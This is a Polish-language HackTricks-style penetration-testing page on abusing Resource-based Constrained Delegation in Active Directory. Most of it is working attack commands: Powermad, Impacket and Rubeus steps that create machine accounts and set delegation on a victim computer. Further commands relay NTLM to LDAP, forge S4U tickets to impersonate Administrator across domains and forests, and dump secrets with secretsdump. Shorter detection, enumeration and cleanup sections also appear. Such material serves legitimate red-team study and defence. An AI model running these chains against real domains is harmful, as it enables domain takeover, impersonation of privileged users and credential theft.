# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Podstawy Resource-based Constrained Delegation

Jest to podobne do podstawowego [Constrained Delegation](constrained-delegation.md), ale **zamiast** nadawać **obiektowi** uprawnienia do **impersonate dowolnego użytkownika względem maszyny**, Resource-based Constrain Delegation **ustawia** w **obiekcie, kto może impersonate dowolnego użytkownika względem niego**.<sup>[[12]](#references)</sup>

W tym przypadku obiekt z ograniczeniem będzie miał atrybut o nazwie _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ zawierający nazwę użytkownika, który może impersonate dowolnego innego użytkownika względem tego obiektu.

Kolejną ważną różnicą między tym rodzajem Constrained Delegation a innymi rodzajami delegacji jest to, że każdy użytkownik z **uprawnieniami zapisu do konta maszyny** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) może ustawić **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (w innych formach Delegation wymagane były uprawnienia domain admin).<sup>[[1]](#references)</sup>

### Nowe pojęcia

W przypadku Constrained Delegation wspomniano, że flaga **`TrustedToAuthForDelegation`** w wartości _userAccountControl_ użytkownika jest wymagana do wykonania **S4U2Self.** Nie jest to jednak całkowicie prawdą.\
W rzeczywistości nawet bez tej wartości można wykonać **S4U2Self** względem dowolnego użytkownika, jeśli jest się **service** (ma się SPN), ale jeśli posiada się **`TrustedToAuthForDelegation`**, zwrócony TGS będzie miał flagę **Forwardable**, a jeśli tej flagi się **nie posiada**, zwrócony TGS **nie będzie** miał flagi **Forwardable**.

Jeśli jednak **TGS** używany w **S4U2Proxy** **nie ma flagi Forwardable**, próba nadużycia podstawowego **Constrain Delegation** **nie powiedzie się**. Jeśli jednak próbuje się wykorzystać **Resource-Based constrain delegation**, zadziała.<sup>[[1]](#references)[[2]](#references)</sup>

### Struktura ataku

> Jeśli masz **równoważne uprawnienia zapisu** do konta **Computer**, możesz uzyskać **uprzywilejowany dostęp** do tej maszyny.

Załóżmy, że attacker ma już **równoważne uprawnienia zapisu do komputera ofiary**.

1. Attacker **compromises** konto, które ma **SPN**, lub **tworzy takie konto** („Service A”). Należy zauważyć, że dowolny _Admin User_ bez innych specjalnych uprawnień może **utworzyć** maksymalnie 10 obiektów Computer (**_MachineAccountQuota_**) i ustawić im **SPN**. Attacker może więc po prostu utworzyć obiekt Computer i ustawić mu SPN.
2. Attacker **nadużywa swojego uprawnienia WRITE** do komputera ofiary (ServiceB), aby skonfigurować resource-based constrained delegation i zezwolić ServiceA na impersonate dowolnego użytkownika względem tego komputera ofiary (ServiceB).
3. Attacker używa Rubeus do wykonania **pełnego ataku S4U** (S4U2Self i S4U2Proxy) z Service A do Service B dla użytkownika z **uprzywilejowanym dostępem do Service B**.
1. S4U2Self (z konta ze skompromitowanym/utworzonym SPN): Poproś o **TGS użytkownika Administrator do mnie** (Not Forwardable).
2. S4U2Proxy: Użyj **TGS bez flagi Forwardable** z poprzedniego kroku, aby poprosić o **TGS** od użytkownika **Administrator** do **hosta ofiary**.
3. Nawet jeśli używasz TGS bez flagi Forwardable, ponieważ wykorzystujesz Resource-based constrained delegation, zadziała.
4. Attacker może wykonać **pass-the-ticket** i **impersonate** użytkownika, aby uzyskać **dostęp do usługi ofiary ServiceB**.<sup>[[1]](#references)</sup>

Aby sprawdzić _**MachineAccountQuota**_ domeny, możesz użyć:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Atak

### Tworzenie obiektu komputera

Możesz utworzyć obiekt komputera w domenie za pomocą **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurowanie Resource-based Constrained Delegation

**Korzystanie z modułu PowerShell activedirectory**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Używanie powerview**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Wykonywanie kompletnego ataku S4U (Windows/Rubeus)

Najpierw utworzyliśmy nowy obiekt komputera z hasłem `123456`, więc potrzebujemy skrótu tego hasła:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Spowoduje to wyświetlenie hashy RC4 i AES dla tego konta.\
Teraz można przeprowadzić atak:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Możesz wygenerować więcej ticketów dla większej liczby usług, prosząc tylko raz, za pomocą parametru `/altservice` narzędzia Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Pamiętaj, że użytkownicy mają atrybut o nazwie "**Cannot be delegated**". Jeśli ten atrybut użytkownika ma wartość True, nie będzie można się pod niego podszyć. Właściwość tę można zobaczyć w bloodhound.

### Narzędzia Linux: kompleksowy RBCD z Impacket (2024+)

Jeśli działasz z poziomu Linuxa, możesz wykonać pełny łańcuch RBCD, korzystając z oficjalnych narzędzi Impacket:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notatki
- Jeśli wymuszane jest LDAP signing/LDAPS, użyj `impacket-rbcd -use-ldaps ...`.
- Preferuj klucze AES; wiele nowoczesnych domen ogranicza RC4. Impacket i Rubeus obsługują zarówno flows wyłącznie z AES.
- Impacket może przepisać `sname` ("AnySPN") dla niektórych narzędzi, ale jeśli to możliwe, uzyskaj poprawny SPN (np. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD między domenami i lasami

Jeśli kontrolowany przez Ciebie **delegating principal** znajduje się w **innej domenie** (lub nawet w **innym lesie**) niż **resource computer**, nadużycie nadal jest **RBCD**, ale przepływ biletów nie jest już standardowym, jednodomenowym `S4U2Self -> S4U2Proxy`.

### RBCD między domenami: skonfiguruj foreign principal za pomocą SID

Gdy ustawiasz `msDS-AllowedToActOnBehalfOfOtherIdentity` z poziomu **innej domeny**, zagraniczny komputer/użytkownik może **nie być rozpoznawalny po nazwie** w LDAP docelowej domeny. W takim przypadku skonfiguruj wpis delegacji, używając **SID** zagranicznego principal zamiast jego sAMAccountName/UPN.

Jest to szczególnie istotne podczas przekazywania NTLM do LDAP za pomocą `ntlmrelayx.py`:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Uwagi:
- `--sid` informuje `ntlmrelayx.py`, aby traktował `--escalate-user` jako SID, co jest wymagane, gdy konto delegujące pochodzi z innej domeny niż docelowa.
- Nawet jeśli narzędzie wyświetli komunikat `User not found in LDAP`, zapis delegacji może się powieść, ponieważ deskryptor zabezpieczeń przechowuje bezpośrednio obcy SID.

### Międzydomenowe RBCD: sekwencja cross-realm S4U

Po dodaniu foreign principal do `msDS-AllowedToActOnBehalfOfOtherIdentity` działający przepływ cross-domain wygląda następująco:<sup>[[9]](#references)[[13]](#references)</sup>

1. Uzyskaj **TGT** dla principal delegującego z jego własnej domeny.
2. Zażądaj **referral TGT** dla `krbtgt/<target-domain>`.
3. Zażądaj **cross-realm S4U2Self referral** dla impersonowanego użytkownika na kontrolerze domeny docelowej.
4. Zażądaj właściwego biletu **S4U2Self** dla tego użytkownika z powrotem w domenie delegującej.
5. Wykonaj **S4U2Proxy** w domenie delegującej, aby uzyskać referral ticket dla domeny docelowej.
6. Wykonaj końcowe **S4U2Proxy** na kontrolerze domeny docelowej, aby uzyskać service ticket dla `cifs/host.target`, `host/host.target` itd.

To dlatego standardowe narzędzia Linux często zawodzą w przypadku cross-domain RBCD:<sup>[[9]](#references)</sup>
- realm żądania może wymagać wartości różnej od realm użytego w TGT w `TGS-REQ`
- łańcuch wymaga **niezależnych kroków S4U2Proxy**, a nie tylko `S4U2Self` lub `S4U2Self` bezpośrednio połączonego z pojedynczym `S4U2Proxy`

### Cross-domain RBCD z Linux

Synacktiv opublikował implementację `getST.py` w Impacket, która odtwarza sekwencję cross-realm z Linux, jawnie obsługując oba KDC:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Operacyjnie nowe argumenty to:
- `-dc-ip`: DC domeny **delegującej**
- `-targetdomain`: domena **komputera zasobu**
- `-targetdc`: DC domeny **zasobu**

### Ograniczenia RBCD między lasami

RBCD między lasami ma istotne ograniczenie: **personifikowany użytkownik musi należeć do tego samego lasu co delegujący principal**. Innymi słowy, jeśli kontrolowane przez Ciebie konto komputera znajduje się w `valhalla.local`, a docelowy zasób w `asgard.local`, zasadniczo **nie możesz personifikować dowolnych użytkowników `asgard.local` względem tego zasobu za pomocą RBCD**.<sup>[[9]](#references)</sup>

Nadal można to wykorzystać, gdy:
- użytkownik z **delegującego lasu** jest **local admin** (lub ma inne uprawnienia uprzywilejowane) na hoście zasobu w drugim lesie
- trust umożliwia wymaganą ścieżkę uwierzytelniania, a obcy SID jest akceptowany w deskryptorze zabezpieczeń docelowego komputera

### Nietypowe zachowanie protokołu RBCD między lasami

RBCD między lasami to nie tylko „cross-domain plus trust”. Zaobserwowany przepływ obejmuje dwa nietypowe elementy, które historycznie są pomijane przez popularne narzędzia:<sup>[[9]](#references)</sup>

1. Dodatkowe żądanie **S4U2Proxy**, które ustawia **`PA-PAC-OPTIONS=branch-aware`**
2. Końcowy service ticket, który może zostać zwrócony z użyciem **RC4**, nawet gdy żądano innych etypes

Praktyczny przepływ wygląda następująco:

1. Uzyskaj TGT dla delegującego principal w lesie A.
2. Zażądaj **S4U2Self** dla personifikowanego użytkownika w lesie A.
3. Zażądaj **S4U2Proxy** w lesie A, aby uzyskać referral TGT dla lasu B.
4. Wyślij drugie **S4U2Proxy** w lesie A **bez ticketu S4U2Self jako additional ticket**, ale z włączoną opcją `branch-aware`, aby uzyskać kolejny referral TGT dla lasu B.
5. Opcjonalnie zażądaj normalnego service ticketu w lesie B dla delegującego principal (ten ticket nie jest wymagany do finalnego wykorzystania).
6. Użyj referral ticketów z kroków 3 i 4, aby zażądać końcowego ticketu **S4U2Proxy** w lesie B dla personifikowanego użytkownika z lasu A względem docelowego SPN.

### RBCD między lasami z systemu Linux

Ta sama gałąź Synacktiv Impacket dodaje przełącznik `-forest` obsługujący tę logikę:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Rekurencyjne wielodomenowe RBCD (3+ domains)

W **multi-domain forests** zarówno **S4U2Self**, jak i **S4U2Proxy** mogą działać **rekurencyjnie**, zamiast zatrzymywać się po jednym referral:

- **Recursive S4U2Self**: pierwsze żądanie `S4U2Self` jest wysyłane do **domeny impersonated user**, pośrednie przeskoki między domeną nadrzędną i podrzędną są pokonywane za pomocą standardowych referralów `TGS-REQ` dla `krbtgt/<REALM>`, a **finalne `S4U2Self`** jest wysyłane we **własnej domenie delegating principal**.
- Oznacza to, że **samo posiadanie TGT** dla konta komputera może wystarczyć do impersonacji **administratora z innej domeny w tym samym forest** oraz żądania `cifs/host`, `host/host`, `wsman/host` itd.
- **Recursive S4U2Proxy** podąża tą samą ścieżką trust: pośrednie przeskoki ponownie wykorzystują poprzedni ticket jako TGT podczas żądania kolejnego referralu `krbtgt/<REALM>`, a tylko ostatni przeskok zwraca finalny service ticket.<sup>[[10]](#references)</sup>

Praktyczny przykład w obrębie tego samego forest to:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less cross-domain / cross-forest RBCD

Jeśli **delegating principal jest użytkownikiem bez SPN**, ostatni rekursywny `S4U2Self` kończy się błędem **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Obejściem jest **ponowienie wyłącznie ostatniego hop jako `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Skrócona wersja łańcucha nadużycia:

1. Uwierzytelnij się za pomocą **hasha NT**, aby skłonić KDC do użycia **RC4-HMAC (etype 23)**.
2. Najpierw zażądaj **`-self -u2u`** i zachowaj ten ticket oddzielnie od późniejszego kroku proxy.
3. Wyodrębnij **klucz sesji TGT** za pomocą `describeTicket.py`.
4. Zastąp **hash NT** użytkownika tym **kluczem sesji**, używając `changepasswd.py -newhashes <session_key>`.
5. Użyj ponownie ticketa `S4U2Self+U2U` jako **`-additional-ticket`** podczas osobnego żądania **`-proxy`**.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Uwagi operacyjne:

- Gdy **pierwszy zaufany hop prowadzi już do innego lasu**, preferuj algorytm **branch-aware** (`getST.py ... -forest`), aby zachować zgodność z natywnym działaniem Windows. Jeśli obcy las jest osiągany dopiero **później** w łańcuchu, przepływ rekurencyjny bez obsługi gałęzi może nadal działać.<sup>[[9]](#references)</sup>
- Na nowszych kontrolerach domeny **Windows Server 2022/2025** wymuszenie RC4 może zakończyć się błędem **`KDC_ERR_ETYPE_NOSUPP`** z powodu wycofywania RC4; może to uniemożliwić **SPN-less RBCD**, mimo że klasyczne RBCD oparte na SPN nadal działa z AES.<sup>[[15]](#references)</sup>
- Uruchom **`S4U2Self+U2U` przed zmianą hasha/hasła użytkownika**: `SamrChangePasswordUser` **nie przelicza ponownie kluczy Kerberos AES** konta, więc wcześniejsza zmiana hasła może uniemożliwić późniejsze żądania biletów.<sup>[[14]](#references)</sup>
- Uwierzytelniane konto nadal musi być **delegable**: **Protected Users** oraz konta z **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** blokują łańcuch.

## Uwagi dotyczące wykrywania / hardeningu

- Ścieżki RBCD między domenami/lasami nadal są zwykle tworzone przez **ACL abuse** lub **relay-to-LDAP**. Wymuś **LDAP signing** i **LDAP channel binding** na kontrolerach domeny, aby przerwać typowe ścieżki konfiguracji.
- Sprawdź, kto może zapisywać `msDS-AllowedToActOnBehalfOfOtherIdentity` na obiektach komputerów, i rozwiąż zapisane identyfikatory SID, w tym **foreign security principals**.
- W środowiskach z wieloma trustami przeanalizuj **Selective Authentication**, **SID filtering** oraz to, czy użytkownicy z obcego lasu mają prawa **local admin** na hostach zasobów.

### Uzyskiwanie dostępu

Ostatnia linia poleceń wykona **complete S4U attack i wstrzyknie TGS** od Administratora do hosta ofiary w **pamięci**.\
W tym przykładzie zażądano TGS dla usługi **CIFS** od Administratora, więc będzie można uzyskać dostęp do **C$**:
```bash
ls \\victim.domain.local\C$
```
### Nadużywanie różnych biletów usług

Dowiedz się więcej o [**dostępnych biletach usług tutaj**](silver-ticket.md#available-services).

## Enumerowanie, audytowanie i czyszczenie

### Enumerowanie komputerów ze skonfigurowanym RBCD

PowerShell (dekodowanie SD w celu rozpoznania SID-ów):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (odczyt lub opróżnienie za pomocą jednej komendy):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Czyszczenie / reset RBCD

- PowerShell (wyczyszczenie atrybutu):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Błędy Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Oznacza to, że Kerberos skonfigurowano tak, aby nie używał DES ani RC4, a Ty dostarczasz wyłącznie hash RC4. Dostarcz do Rubeus co najmniej hash AES256 (albo po prostu dostarcz hashe rc4, aes128 i aes256). Przykład: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** podczas `-self` dla zwykłego użytkownika: delegating principal prawdopodobnie **nie ma SPN**. Ponów **ostatni etap** jako **`S4U2Self+U2U`** zamiast zwykłego **`S4U2Self`**.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** podczas **SPN-less RBCD**: nowsze DC mogą odrzucać wymuszoną ścieżkę **RC4-HMAC**, wymaganą przez sztuczkę **`S4U2Self+U2U` + session-key-substitution**. Spróbuj zamiast tego klasycznej ścieżki **SPN-backed** RBCD z AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Oznacza to, że czas bieżącego komputera różni się od czasu DC i Kerberos nie działa prawidłowo.
- **`preauth_failed`**: Oznacza to, że podana kombinacja nazwy użytkownika i hashy nie działa podczas logowania. Możliwe, że zapomniałeś dodać znak "$" do nazwy użytkownika podczas generowania hashy (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Może to oznaczać:
- Użytkownik, którego próbujesz impersonate, nie może uzyskać dostępu do żądanej usługi (ponieważ nie możesz go impersonate albo nie ma wystarczających uprawnień)
- Żądana usługa nie istnieje (jeśli żądasz biletu dla winrm, ale winrm nie działa)
- Utworzony fakecomputer utracił uprawnienia do podatnego serwera i musisz nadać mu je ponownie.
- Nadużywasz klasycznego KCD; pamiętaj, że RBCD działa z nie-forwardable biletami S4U2Self, podczas gdy KCD wymaga forwardable.

## Uwagi, relays i alternatywy

- Możesz również zapisać RBCD SD za pośrednictwem AD Web Services (ADWS), jeśli LDAP jest filtrowany. Zobacz:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Łańcuchy Kerberos relay często kończą się na RBCD, aby jednym krokiem uzyskać lokalny SYSTEM. Zobacz praktyczne przykłady end-to-end:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Jeśli LDAP signing/channel binding są **wyłączone** i możesz utworzyć machine account, narzędzia takie jak **KrbRelayUp** mogą przekazać wymuszone uwierzytelnianie Kerberos do LDAP, ustawić `msDS-AllowedToActOnBehalfOfOtherIdentity` dla Twojego machine account na obiekcie docelowego komputera i natychmiast dokonać impersonation użytkownika **Administrator** za pomocą S4U z off-host.<sup>[[8]](#references)</sup>

## Referencje

- [1] [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [2] [Another Word on Delegation](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Resource-Based Constrained Delegation Abuse](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: An Offensive Kerberos Overview](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (official)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Quick Linux cheatsheet with recent syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
